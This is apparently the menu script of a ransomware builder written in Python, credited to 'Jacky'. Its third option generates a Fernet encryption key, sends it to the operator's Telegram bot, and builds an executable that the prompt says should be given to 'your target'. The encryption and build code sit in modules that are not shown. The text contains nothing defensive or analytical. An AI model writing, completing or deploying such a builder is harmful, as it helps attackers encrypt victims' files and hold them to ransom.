import sys
from colorama import Fore
import ToJa
import banner
from cryptography.fernet import Fernet
import os
import time

key2= Fernet.generate_key()

#Install Requirements
os.system("cls")
print(Fore.GREEN+"\n Checking Libraries...")
time.sleep(0.3)
print(Fore.WHITE+"")
os.system("pip install --upgrade pip")
os.system("pip install -r requirements.txt")
#Finish Install Requirements

banner.banner()
banner.infolist1()

try:
    sel = input(Fore.LIGHTWHITE_EX+"--> ")
except KeyboardInterrupt:
    print("")
    sys.exit()
if int(sel) == 1:
    ToJa.soc1()
elif int(sel) == 2:
    ToJa.soc()
elif int(sel) == 3:
    print(Fore.RED+" [!] "+Fore.BLUE+" This Tool Send The Key Of Encrypt To Your Bot And Make Exe File And You Should Give It To Your Target ")
    time.sleep(0.3)
    token = input(Fore.RED+"\n [!] Enter Your Bot Token : ")
    banner.banner()
    chat = input(Fore.YELLOW+"\n [!] Enter Your Chat Id In Telegram : ")
    time.sleep(0.3)
    ToJa.soc2(token,chat,str(key2))
    print(Fore.GREEN+"\n [+] "+Fore.BLUE+"The Key Of Encrypt Is Sent To Your Bot! ")
    print(Fore.GREEN+"\n [*] "+Fore.WHITE+"Please Wait For Building Exe File... \n")
    time.sleep(1)
    ToJa.soc3()
elif int(sel) == 4:
    print(Fore.RED+" Creator : Jacky\n"+Fore.YELLOW+" ID Telegram : @Jacky_hard\n"+Fore.GREEN+" Version : 1.0\n"+Fore.LIGHTBLUE_EX+" Please Support Us :)")
else:
    sys.exit()